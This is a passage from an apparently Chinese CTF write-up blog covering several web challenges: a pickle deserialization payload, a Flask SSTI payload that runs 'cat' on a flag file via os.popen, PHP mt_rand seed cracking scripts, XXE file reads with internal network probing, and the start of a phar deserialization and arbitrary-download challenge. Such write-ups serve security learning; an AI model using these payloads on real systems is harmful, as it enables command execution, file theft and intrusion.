class="line"><span class="built_in">print</span> urllib.quote(pickle.dumps(a))</span><br></pre></td></tr></table></figure>
<p>先不要问我为什么不能用opcode，问就是本地可以靶场不行，估计是什么模块靶场没安装吧<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666840087585-a2fb7f62-7274-470e-9a89-30c00b2fad07.png#averageHue=%2331302e&clientId=u88b30c86-53aa-4&from=paste&height=42&id=u01d68c85&name=image.png&originHeight=52&originWidth=1335&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10957&status=done&style=none&taskId=uc052c80b-fbb9-487d-9f51-5752168c655&title=&width=1068" alt="image.png"><br>得到payload，直接传进去：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666840236442-b19756e8-60f8-433b-9d47-018705343298.png#averageHue=%23ead0a7&clientId=u88b30c86-53aa-4&from=paste&height=416&id=u5a50de7c&name=image.png&originHeight=520&originWidth=1661&originalType=binary&ratio=1&rotation=0&showTitle=false&size=72964&status=done&style=none&taskId=ub2176710-1ad1-4617-9031-7f5cbd394d2&title=&width=1328.8" alt="image.png"><br>在hackbar中记得encode一下，因为浏览器要解码一次<br>然后记得点一下一件成为大会员，点了这个才会给你载荷<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666840304018-3ca86c02-a01b-4bb9-8d8f-ea29dbb41bbc.png#averageHue=%232e2d2c&clientId=u88b30c86-53aa-4&from=paste&height=130&id=u2c007d23&name=image.png&originHeight=162&originWidth=1144&originalType=binary&ratio=1&rotation=0&showTitle=false&size=36758&status=done&style=none&taskId=u1a112088-1b21-4301-9d32-331cfa3e6ca&title=&width=915.2" alt="image.png"><br>最终可以得出答案，burp里就不需要url编码：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666840317302-b5b2ff77-99a1-4300-b1fc-dd56357c33b5.png#averageHue=%23f7f1f1&clientId=u88b30c86-53aa-4&from=paste&height=135&id=ue0dd39d6&name=image.png&originHeight=169&originWidth=1146&originalType=binary&ratio=1&rotation=0&showTitle=false&size=39351&status=done&style=none&taskId=ud0509c66-6d38-4370-b5bf-3f427714dee&title=&width=916.8" alt="image.png"></p>
<h2 id="CSCCTF-2019-Qual-FlaskLight"><a href="#CSCCTF-2019-Qual-FlaskLight" class="headerlink" title="[CSCCTF 2019 Qual]FlaskLight"></a>[CSCCTF 2019 Qual]FlaskLight</h2><p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666840888804-4e73e93c-8abf-42bb-9edb-f8dc964e24bd.png#averageHue=%23fcfcfc&clientId=u88b30c86-53aa-4&from=paste&height=384&id=u49540972&name=image.png&originHeight=480&originWidth=1355&originalType=binary&ratio=1&rotation=0&showTitle=false&size=21416&status=done&style=none&taskId=u6f516d83-c564-4f0b-8ec2-906b4345a79&title=&width=1084" alt="image.png"><br>访问源码：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666840896125-dc36b7d1-8546-48d5-b1a4-d7750f37d665.png#averageHue=%23fcfcfc&clientId=u88b30c86-53aa-4&from=paste&height=76&id=u7958f205&name=image.png&originHeight=95&originWidth=419&originalType=binary&ratio=1&rotation=0&showTitle=false&size=3403&status=done&style=none&taskId=u0401cb5a-65f6-4c95-930b-d30a60b7d22&title=&width=335.2" alt="image.png"><br>直接就上payload了，很简单SSTI<br>：<code>?search=&#123;&#123;lipsum[request.args.a].os.popen(%27cat%20/flasklight/coomme_geeeett_youur_flek%27).read()&#125;&#125;&amp;a=__globals__</code></p>
<h2 id="GWCTF-2019-枯燥的抽奖"><a href="#GWCTF-2019-枯燥的抽奖" class="headerlink" title="[GWCTF 2019]枯燥的抽奖"></a>[GWCTF 2019]枯燥的抽奖</h2><p>考点：伪随机数<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666842487289-e48f503c-24f4-4595-9035-2c3b38b4b127.png#averageHue=%23f8f7f6&clientId=u960c29c8-80ce-4&from=paste&height=337&id=ub06f5bc0&name=image.png&originHeight=421&originWidth=1627&originalType=binary&ratio=1&rotation=0&showTitle=false&size=156760&status=done&style=none&taskId=u737c6a57-64eb-4429-89a9-f8b45af1277&title=&width=1301.6" alt="image.png"><br>查看源代码：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666842526047-25561023-fd81-46db-b05c-a83a4259e0f4.png#averageHue=%23f4f4f4&clientId=u960c29c8-80ce-4&from=paste&height=147&id=u57deac11&name=image.png&originHeight=184&originWidth=506&originalType=binary&ratio=1&rotation=0&showTitle=false&size=5603&status=done&style=none&taskId=ub9ab85b4-3269-404b-aa09-c6694ec4c2e&title=&width=404.8" alt="image.png"><br>发现check.php:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666842536234-eea32953-6827-447d-94d2-969cc0c35f38.png#averageHue=%23fefcfc&clientId=u960c29c8-80ce-4&from=paste&height=427&id=u2a153f75&name=image.png&originHeight=534&originWidth=1306&originalType=binary&ratio=1&rotation=0&showTitle=false&size=19117&status=done&style=none&taskId=uaa5f403b-e3e1-4412-b681-709250a38ce&title=&width=1044.8" alt="image.png"><br>可以看到代码用的是mt_srand设置的种子<br>这一题考的就是如何利用php_mt_seed去获得种子，先把我们前十位数字化为脚本能识别的数字</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">str1=<span class="string">&#x27;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&#x27;</span></span><br><span class="line">str2=<span class="string">&#x27;enZ5ZoZ0Vn&#x27;</span></span><br><span class="line">str3 = str1[::-<span class="number">1</span>]</span><br><span class="line">length = <span class="built_in">len</span>(str2)</span><br><span class="line">res=<span class="string">&#x27;&#x27;</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str2)):</span><br><span class="line">    <span class="keyword">for</span> j <span class="keyword">in</span> <span class="built_in">range</span>(<span class="built_in">len</span>(str1)):</span><br><span class="line">        <span class="keyword">if</span> str2[i] == str1[j]:</span><br><span class="line">            res+=<span class="built_in">str</span>(j)+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(j)+<span class="string">&#x27; &#x27;</span>+<span class="string">&#x27;0&#x27;</span>+<span class="string">&#x27; &#x27;</span>+<span class="built_in">str</span>(<span class="built_in">len</span>(str1)-<span class="number">1</span>)+<span class="string">&#x27; &#x27;</span></span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"><span class="built_in">print</span>(res)</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666842718906-c15ea078-77d5-438a-a6eb-0105e8c30f61.png#averageHue=%2326282f&clientId=u960c29c8-80ce-4&from=paste&height=189&id=u50a7881f&name=image.png&originHeight=236&originWidth=655&originalType=binary&ratio=1&rotation=0&showTitle=false&size=78406&status=done&style=none&taskId=uc3236b20-a2ab-4d02-9db3-6adc3661dae&title=&width=524" alt="image.png"><br>得到种子135063921<br>然后在本地运行运行php：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">mt_srand(<span class="number">135063921</span>);</span><br><span class="line">$str_long1 = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ&quot;</span>;</span><br><span class="line">$<span class="built_in">str</span>=<span class="string">&#x27;&#x27;</span>;</span><br><span class="line">$len1=<span class="number">20</span>;</span><br><span class="line"><span class="keyword">for</span> ( $i = <span class="number">0</span>; $i &lt; $len1; $i++ )&#123;</span><br><span class="line">    $<span class="built_in">str</span>.=substr($str_long1, mt_rand(<span class="number">0</span>, strlen($str_long1) - <span class="number">1</span>), <span class="number">1</span>);       </span><br><span class="line">&#125;</span><br><span class="line">$str_show = substr($<span class="built_in">str</span>, <span class="number">0</span>, <span class="number">10</span>);</span><br><span class="line">echo <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.$str_show.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line">echo <span class="string">&quot;&lt;p id=&#x27;p1&#x27;&gt;&quot;</span>.$<span class="built_in">str</span>.<span class="string">&quot;&lt;/p&gt;&quot;</span>;</span><br><span class="line"></span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666842731774-7a4f63b1-cf65-41c7-b0de-4d6a931ef443.png#averageHue=%23f2d394&clientId=u960c29c8-80ce-4&from=paste&height=132&id=ud72ec878&name=image.png&originHeight=165&originWidth=661&originalType=binary&ratio=1&rotation=0&showTitle=false&size=9326&status=done&style=none&taskId=u656d09d3-2e83-45d4-be3b-dd92d956b4b&title=&width=528.8" alt="image.png"><br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666842737066-7253ddc4-54c3-4a44-9844-dc2fd765fc17.png#averageHue=%23dbedd3&clientId=u960c29c8-80ce-4&from=paste&height=72&id=u0c3a1075&name=image.png&originHeight=90&originWidth=882&originalType=binary&ratio=1&rotation=0&showTitle=false&size=10847&status=done&style=none&taskId=ud72a505d-59bb-4836-9475-0f58c250438&title=&width=705.6" alt="image.png"></p>
<h2 id="NCTF2019-True-XML-cookbook"><a href="#NCTF2019-True-XML-cookbook" class="headerlink" title="[NCTF2019]True XML cookbook"></a>[NCTF2019]True XML cookbook</h2><p>考点：XXE注入<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666921608273-cb1b3dbd-862a-4f58-a823-3a8f2839f9fd.png#averageHue=%231a1b17&clientId=u219e3420-601a-4&from=paste&height=646&id=u85b9176f&name=image.png&originHeight=807&originWidth=1451&originalType=binary&ratio=1&rotation=0&showTitle=false&size=55715&status=done&style=none&taskId=u538d06a9-8d6f-4e68-a6af-7401d151412&title=&width=1160.8" alt="image.png"><br>和之前的fake xml cookbook有点像，抓个包：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666921624613-acd589b4-0675-4bb4-96ba-8283155e7b49.png#averageHue=%23f7f7f7&clientId=u219e3420-601a-4&from=paste&height=254&id=u97969203&name=image.png&originHeight=318&originWidth=1097&originalType=binary&ratio=1&rotation=0&showTitle=false&size=34371&status=done&style=none&taskId=uea8d9487-a0a2-4b0a-ad59-afb6a92a0c2&title=&width=877.6" alt="image.png"><br>你会发现可以读取文件，但是flag文件不知道在哪儿，看了下wp才知道：</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">/proc/net/tcp<span class="comment">#文件提供了tcp的连接信息</span></span><br><span class="line">/proc/net/udp<span class="comment">#udp的数据</span></span><br><span class="line">/proc/net/dev<span class="comment">#就是提供给用户读取或更改网络适配器及统计信息的途径。</span></span><br><span class="line">/proc/net/arp<span class="comment">#每个网络接口的arp表中dev包的统计</span></span><br><span class="line">/proc/net/fib_trie<span class="comment"># 路由缓存</span></span><br></pre></td></tr></table></figure>
<p>查看一下<code>/proc/net/fib_trie</code>:<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666921901674-06d25e81-3f85-49b4-a614-ca780c3f8949.png#averageHue=%23f7f6f6&clientId=u219e3420-601a-4&from=paste&height=338&id=u6b151a56&name=image.png&originHeight=423&originWidth=1276&originalType=binary&ratio=1&rotation=0&showTitle=false&size=62605&status=done&style=none&taskId=ue747d40e-8121-4d1f-8396-621e1ef780a&title=&width=1020.8" alt="image.png"><br>看到了一个内网ip对他的D段ip进行爆破：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666921956243-5f10515f-f7a9-4e86-b8a2-d33167ff4b68.png#averageHue=%23faf4ef&clientId=u219e3420-601a-4&from=paste&height=141&id=uff25cd24&name=image.png&originHeight=176&originWidth=651&originalType=binary&ratio=1&rotation=0&showTitle=false&size=15144&status=done&style=none&taskId=u426b312f-81f2-4061-be01-1112cf2559f&title=&width=520.8" alt="image.png"><br>在<code>10.244.80.54</code>发现了flag：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666921979704-069b9da1-da0a-40fa-ada6-a3147f18ac92.png#averageHue=%23f9f5f2&clientId=u219e3420-601a-4&from=paste&height=418&id=uca92c60d&name=image.png&originHeight=522&originWidth=878&originalType=binary&ratio=1&rotation=0&showTitle=false&size=55691&status=done&style=none&taskId=u423597a2-e30d-4716-94ef-e2b37e46ce4&title=&width=702.4" alt="image.png"><br>还读了一下源码：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment">* autor: c0ny1</span></span><br><span class="line"><span class="comment">* date: 2018-2-7</span></span><br><span class="line"><span class="comment">*/</span></span><br><span class="line"></span><br><span class="line"><span class="variable">$USERNAME</span> = <span class="string">&#x27;admin&#x27;</span>; <span class="comment">//账号</span></span><br><span class="line"><span class="variable">$PASSWORD</span> = <span class="string">&#x27;024b87931a03f738fff6693ce0a78c88&#x27;</span>; <span class="comment">//密码</span></span><br><span class="line"><span class="variable">$result</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">libxml_disable_entity_loader</span>(<span class="literal">false</span>);</span><br><span class="line"><span class="variable">$xmlfile</span> = <span class="title function_ invoke__">file_get_contents</span>(<span class="string">&#x27;php://input&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">try</span>&#123;</span><br><span class="line">	<span class="variable">$dom</span> = <span class="keyword">new</span> <span class="title class_">DOMDocument</span>();</span><br><span class="line">	<span class="variable">$dom</span>-&gt;<span class="title function_ invoke__">loadXML</span>(<span class="variable">$xmlfile</span>, LIBXML_NOENT | LIBXML_DTDLOAD);</span><br><span class="line">	<span class="variable">$creds</span> = <span class="title function_ invoke__">simplexml_import_dom</span>(<span class="variable">$dom</span>);</span><br><span class="line"></span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$creds</span>-&gt;username;</span><br><span class="line">	<span class="variable">$password</span> = <span class="variable">$creds</span>-&gt;password;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$username</span> == <span class="variable">$USERNAME</span> &amp;&amp; <span class="variable">$password</span> == <span class="variable">$PASSWORD</span>)&#123;</span><br><span class="line">		<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">1</span>,<span class="variable">$username</span>);</span><br><span class="line">	&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">		<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">0</span>,<span class="variable">$username</span>);</span><br><span class="line">	&#125;	</span><br><span class="line">&#125;<span class="keyword">catch</span>(<span class="built_in">Exception</span> <span class="variable">$e</span>)&#123;</span><br><span class="line">	<span class="variable">$result</span> = <span class="title function_ invoke__">sprintf</span>(<span class="string">&quot;&lt;result&gt;&lt;code&gt;%d&lt;/code&gt;&lt;msg&gt;%s&lt;/msg&gt;&lt;/result&gt;&quot;</span>,<span class="number">3</span>,<span class="variable">$e</span>-&gt;<span class="title function_ invoke__">getMessage</span>());</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">header</span>(<span class="string">&#x27;Content-Type: text/html; charset=utf-8&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$result</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>

<h2 id="CISCN2019-华北赛区-Day1-Web1-Dropbox"><a href="#CISCN2019-华北赛区-Day1-Web1-Dropbox" class="headerlink" title="[CISCN2019 华北赛区 Day1 Web1]Dropbox"></a>[CISCN2019 华北赛区 Day1 Web1]Dropbox</h2><p>考点：phar反序列化，代码审计，任意文件下载<br>首先页面是个注册登入界面，测试过，也没啥sql注入之类的，就普通注册个账号登入：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666932126652-a24e6ba9-0589-451e-a0f8-fd085133a25d.png#averageHue=%23f0e3c0&clientId=u219e3420-601a-4&from=paste&height=246&id=u927c701d&name=image.png&originHeight=308&originWidth=1920&originalType=binary&ratio=1&rotation=0&showTitle=false&size=24812&status=done&style=none&taskId=udce39870-b90f-444f-80b5-c7d5b4a5db3&title=&width=1536" alt="image.png"><br>可以发现有个文件上传的地方，我们随便上传一张图片：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666932151217-2ef8a6ea-e1c6-4c39-9112-2352a2cf4fe4.png#averageHue=%23fefefe&clientId=u219e3420-601a-4&from=paste&height=199&id=u787e0354&name=image.png&originHeight=249&originWidth=1610&originalType=binary&ratio=1&rotation=0&showTitle=false&size=13660&status=done&style=none&taskId=u6c8c21fa-1767-4520-b6cf-978872a8d69&title=&width=1288" alt="image.png"><br>我们点下载，然后抓包，可能是挖过洞了，有点思路，遇到下载的地方，我就会测试有没有任意文件下载：<br><img src="https://cdn.nlark.com/yuque/0/2022/png/32634994/1666932192415-1b9a459a-2442-4bc3-9f22-e3d8b9d6cb32.png#averageHue=%23f7f7f7&clientId=u219e3420-601a-4&from=paste&height=387&id=u2ee21bf2&name=image.png&originHeight=484&originWidth=1291&originalType=binary&ratio=1&rotation=0&showTitle=false&size=65159&status=done&style=none&taskId=uf16a2289-e945-4bb1-ad87-4cd40b5b204&title=&width=1032.8" alt="image.png"><br>可以发现是存在任意文件下载的，这边可以读取源文件，那就一个个都读过去：</p>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">&lt;!DOCTYPE html&gt;</span><br><span class="line">&lt;html&gt;</span><br><span class="line"></span><br><span class="line">&lt;meta charset=<span class="string">&quot;utf-8&quot;</span>&gt;</span><br><span class="line">&lt;meta name=<span class="string">&quot;viewport&quot;</span> content=<span class="string">&quot;width=device-width, initial-scale=1, shrink-to-fit=no&quot;</span>&gt;</span><br><span class="line">&lt;title&gt;网盘管理&lt;/title&gt;</span><br><span class="line"></span><br><span class="line">&lt;head&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;static/css/bootstrap.min.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">    &lt;link href=<span class="string">&quot;static/css/panel.css&quot;</span> rel=<span class="string">&quot;stylesheet&quot;</span>&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/jquery.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/bootstrap.bundle.min.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/toast.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">    &lt;script src=<span class="string">&quot;static/js/panel.js&quot;</span>&gt;&lt;/script&gt;</span><br><span class="line">&lt;/head&gt;</span><br><span class="line"></span><br><span class="line">&lt;body&gt;</span><br><span class="line">    &lt;nav aria-label=<span class="string">&quot;breadcrumb&quot;</span>&gt;</span><br><span class="line">    &lt;ol <span class="class"><span class="keyword">class</span>=&quot;<span class="title">breadcrumb</span>&quot;&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">breadcrumb</span>-<span class="title">item</span> <span class="title">active</span>&quot;&gt;管理面板&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">breadcrumb</span>-<span class="title">item</span> <span class="title">active</span>&quot;&gt;&lt;<span class="title">label</span> <span class="title">for</span>=&quot;<span class="title">fileInput</span>&quot; <span class="title">class</span>=&quot;<span class="title">fileLabel</span>&quot;&gt;上传文件&lt;/<span class="title">label</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">        &lt;<span class="title">li</span> <span class="title">class</span>=&quot;<span class="title">active</span> <span class="title">ml</span>-<span class="title">auto</span>&quot;&gt;&lt;<span class="title">a</span> <span class="title">href</span>=&quot;#&quot;&gt;你好 &lt;?<span class="title">php</span> <span class="title">echo</span> $<span class="title">_SESSION</span>[&#x27;<span class="title">username</span>&#x27;]?&gt;&lt;/<span class="title">a</span>&gt;&lt;/<span class="title">li</span>&gt;</span></span><br><span class="line"><span class="class">    &lt;/<span class="title">ol</span>&gt;</span></span><br><span class="line"><span class="class">&lt;/<span class="title">nav</span>&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">input</span> <span class="title">type</span>=&quot;<span class="title">file</span>&quot; <span class="title">id</span>=&quot;<span class="title">fileInput</span>&quot; <span class="title">class</span>=&quot;<span class="title">hidden</span>&quot;&gt;</span></span><br><span class="line"><span class="class">&lt;<span class="title">div</span> <span class="title">class</span>=&quot;<span class="title">top</span>&quot; <span class="title">id</span>=&quot;<span class="title">toast</span>-<span class="title">container</span>&quot;&gt;&lt;/<span class="title">div</span>&gt;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">&lt;?<span class="title">php</span></span></span><br><span class="line"><span class="class"><span class="title">include</span> &quot;<span class="title">class</span>.<span class="title">php</span>&quot;;</span></span><br><span class="line"><span class="class"></span></span><br><span class="line"><span class="class">$<span class="title">a</span> = <span class="title">new</span> <span class="title">FileList</span>($<span class="title">_SESSION</span>[&#x27;<span class="title">sandbox</span>&#x27;]);</span></span><br><span class="line"><span class="class">$<span class="title">a</span>-&gt;<span class="title">Name</span>();</span></span><br><span class="line"><span class="class">$<span class="title">a</span>-&gt;<span class="title">Size</span>();</span></span><br><span class="line"><span class="class">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: login.php&quot;</span>);</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">isset</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>])) &#123;</span><br><span class="line">    <span class="keyword">die</span>();</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">include</span> <span class="string">&quot;class.php&quot;</span>;</span><br><span class="line"><span class="title function_ invoke__">ini_set</span>(<span class="string">&quot;open_basedir&quot;</span>, <span class="title function_ invoke__">getcwd</span>() . <span class="string">&quot;:/etc:/tmp&quot;</span>);</span><br><span class="line"></span><br><span class="line"><span class="title function_ invoke__">chdir</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;sandbox&#x27;</span>]);</span><br><span class="line"><span class="variable">$file</span> = <span class="keyword">new</span> <span class="title class_">File</span>();</span><br><span class="line"><span class="variable">$filename</span> = (<span class="keyword">string</span>) <span class="variable">$_POST</span>[<span class="string">&#x27;filename&#x27;</span>];</span><br><span class="line"><span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$filename</span>) &lt; <span class="number">40</span> &amp;&amp; <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">open</span>(<span class="variable">$filename</span>) &amp;&amp; <span class="title function_ invoke__">stristr</span>(<span class="variable">$filename</span>, <span class="string">&quot;flag&quot;</span>) === <span class="literal">false</span>) &#123;</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-type: application/octet-stream&quot;</span>);</span><br><span class="line">    <span class="title function_ invoke__">Header</span>(<span class="string">&quot;Content-Disposition: attachment; filename=&quot;</span> . <span class="title function_ invoke__">basename</span>(<span class="variable">$filename</span>));</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$file</span>-&gt;<span class="title function_ invoke__">close</span>();</span><br><span class="line">&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;File not exist&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="title function_ invoke__">session_start</span>();</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;login&#x27;</span>])) &#123;</span><br><span class="line">    <span class="title function_ invoke__">header</span>(<span class="string">&quot;Location: 